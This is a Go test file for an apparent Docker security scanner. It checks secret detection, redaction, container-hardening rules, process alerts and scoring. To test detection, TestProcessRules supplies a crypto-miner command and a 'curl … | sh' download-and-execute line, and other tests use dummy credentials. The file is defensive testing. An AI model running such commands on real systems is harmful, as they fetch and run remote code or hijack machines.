package scan

import (
	"strings"
	"testing"
	"time"

	"github.com/keelwatch/keelwatch/internal/docker"
	"github.com/keelwatch/keelwatch/internal/model"
)

func TestClassifyKV(t *testing.T) {
	cases := []struct {
		k, v string
		want string // "" none, "known", "weak", "plain"
	}{
		{"AWS_ACCESS_KEY_ID", "AKIAQ3EGTX7LZFDEMO42", "known"},
		{"GH", "ghp_" + strings.Repeat("a", 36), "known"},
		{"DATABASE_URL", "postgres://u:hunter22@db:5432/x", "known"},
		{"DATABASE_URL", "postgres://db:5432/x", ""},
		{"POSTGRES_PASSWORD", "postgres", "weak"},
		{"POSTGRES_PASSWORD_FILE", "/run/secrets/pg", ""},
		{"APP_KEY", "base64:Zm9vYmFyYmF6cXV4", "plain"},
		{"SECRET_KEY", "", ""},
		{"API_TOKEN", "${API_TOKEN}", ""},
		{"LOG_LEVEL", "debug", ""},
		{"PUBLIC_KEY", "ssh-ed25519 AAAAC3Nza", ""},
		{"JWT_EXPIRY", "3600", ""},
		{"PASSWORD", "true", ""},
	}
	for _, c := range cases {
		h := classifyKV(c.k, c.v)
		got := ""
		if h != nil {
			switch {
			case h.Known:
				got = "known"
			case h.Weak:
				got = "weak"
			default:
				got = "plain"
			}
		}
		if got != c.want {
			t.Errorf("%s=%q: got %q want %q", c.k, c.v, got, c.want)
		}
	}
}

func TestRedactNeverLeaks(t *testing.T) {
	v := "wJalrXUtnFEMI/K7MDENG/bPxRfiCYDEMOKEY"
	r := Redact(v)
	if strings.Contains(r, v[4:]) {
		t.Fatalf("redaction leaked value: %s", r)
	}
	if short := Redact("abc12345"); strings.Contains(short, "abc1") {
		t.Fatalf("short values must not show a prefix: %s", short)
	}
}

func rulesOf(fs []model.Finding) map[string]model.Finding {
	m := map[string]model.Finding{}
	for _, f := range fs {
		m[f.Rule] = f
	}
	return m
}

func TestContainerRules(t *testing.T) {
	var c docker.ContainerJSON
	c.ID, c.Name = "abc", "/web"
	c.Config.Image = "nginx:latest"
	c.HostConfig.Privileged = true
	c.HostConfig.NetworkMode = "host"
	c.HostConfig.CapAdd = []string{"CAP_SYS_ADMIN"}
	c.Mounts = append(c.Mounts, struct {
		Type, Source, Destination string
		RW                        bool
	}{"bind", "/var/run/docker.sock", "/var/run/docker.sock", false})
	c.Config.Env = []string{"STRIPE=sk_live_" + strings.Repeat("x", 24)}
	c.State.Status, c.State.OOMKilled = "exited", true
	r := rulesOf(ContainerRules(c, nil))
	for _, want := range []string{"privileged", "host-network", "dangerous-cap", "docker-socket", "env-secret", "runs-as-root", "latest-tag", "oom-killed", "no-memory-limit"} {
		if _, ok := r[want]; !ok {
			t.Errorf("missing rule %s", want)
		}
	}
	if r["privileged"].Severity != model.SevCritical || r["docker-socket"].Severity != model.SevCritical {
		t.Error("privileged and docker.sock must be critical")
	}
	if strings.Contains(r["env-secret"].Evidence, strings.Repeat("x", 24)) {
		t.Error("evidence must be redacted")
	}

	// A hardened container should be quiet.
	var h docker.ContainerJSON
	h.ID, h.Name = "def", "/vault"
	h.Config.Image = "vaultwarden/server:1.32.0"
	h.Config.User = "1000:1000"
	h.Config.Healthcheck = &struct{ Test []string }{[]string{"CMD", "/hc"}}
	h.HostConfig.ReadonlyRootfs = true
	h.HostConfig.Memory, h.HostConfig.NanoCpus = 256<<20, 1e9
	p := int64(100)
	h.HostConfig.PidsLimit = &p
	h.HostConfig.SecurityOpt = []string{"no-new-privileges:true"}
	h.HostConfig.LogConfig.Type = "json-file"
	h.HostConfig.LogConfig.Config = map[string]string{"max-size": "10m"}
	h.HostConfig.RestartPolicy.Name = "unless-stopped"
	h.State.Status, h.State.Running = "running", true
	if fs := ContainerRules(h, nil); len(fs) != 0 {
		for _, f := range fs {
			t.Errorf("hardened container flagged: %s %s", f.Rule, f.Title)
		}
	}
}

func TestExposedPortOnlyWhenPublic(t *testing.T) {
	var c docker.ContainerJSON
	c.Name = "/x"
	c.HostConfig.PortBindings = map[string][]struct {
		HostIP   string `json:"HostIp"`
		HostPort string
	}{"80/tcp": {{HostIP: "127.0.0.1", HostPort: "8080"}}, "443/tcp": {{HostIP: "", HostPort: "8443"}}}
	n := 0
	for _, f := range ContainerRules(c, nil) {
		if f.Rule == "exposed-port" {
			n++
			if !strings.Contains(f.Title, "8443") {
				t.Errorf("wrong port flagged: %s", f.Title)
			}
		}
	}
	if n != 1 {
		t.Fatalf("want 1 exposed-port finding, got %d", n)
	}
}

func TestProcessRules(t *testing.T) {
	var c docker.ContainerJSON
	c.Name = "/app"
	fs, seen := ProcessRules(c, []string{"node index.js", "/tmp/xmrig -o stratum+tcp://pool:3333", "bash -c curl -s http://x/a.sh | sh"}, nil, true)
	r := rulesOf(fs)
	if r["proc-miner"].Severity != model.SevCritical {
		t.Error("miner not detected")
	}
	if _, ok := r["proc-dlexec"]; !ok {
		t.Error("download-and-exec not detected")
	}
	if !seen["node"] {
		t.Error("baseline should include node")
	}
	// drift after learning
	fs, _ = ProcessRules(c, []string{"node index.js", "sh"}, map[string]bool{"node": true}, false)
	if r := rulesOf(fs); r["proc-drift"].Severity != model.SevHigh {
		t.Error("new shell process should be high-severity drift")
	}
}

func TestEventAlertIgnoresHealthchecks(t *testing.T) {
	ev := docker.Event{Type: "container", Action: "exec_start: /bin/sh -c curl -f http://localhost/health", Time: time.Now().Unix()}
	ev.Actor.Attributes = map[string]string{"name": "web"}
	if a := EventAlert(ev, map[string]string{"web": "curl -f http://localhost/health"}); a != nil {
		t.Fatalf("health probe raised alert: %+v", a)
	}
	ev.Action = "exec_start: bash"
	if a := EventAlert(ev, nil); a == nil || a.Severity != model.SevHigh {
		t.Fatalf("interactive shell should be high: %+v", a)
	}
}

func TestScoreBehaviour(t *testing.T) {
	snap := &model.Snapshot{Containers: []model.ContainerView{{ID: "a", ImageID: "i"}}}
	Score(snap)
	if snap.Score != 100 || snap.Grade != "A" {
		t.Fatalf("clean host should score 100/A, got %d/%s", snap.Score, snap.Grade)
	}
	snap.Findings = []model.Finding{{ID: "1", Severity: model.SevLow, Category: model.CatPractices, TargetType: model.TargetContainer, TargetID: "a"}}
	Score(snap)
	low := snap.Score
	snap.Findings = append(snap.Findings, model.Finding{ID: "2", Severity: model.SevCritical, Category: model.CatConfig, TargetType: model.TargetImage, TargetID: "i"})
	Score(snap)
	if snap.Score >= low || snap.Score > 69 {
		t.Fatalf("critical must lower score and cap at 69: %d (was %d)", snap.Score, low)
	}
	if snap.Containers[0].Counts[model.SevCritical] != 1 {
		t.Fatal("image finding should count against the container using it")
	}
	for i := range snap.Findings {
		if snap.Findings[i].ID == "2" {
			snap.Findings[i].Suppressed = true
		}
	}
	Score(snap)
	if snap.Score != low {
		t.Fatalf("suppressed finding should not count: %d vs %d", snap.Score, low)
	}
}
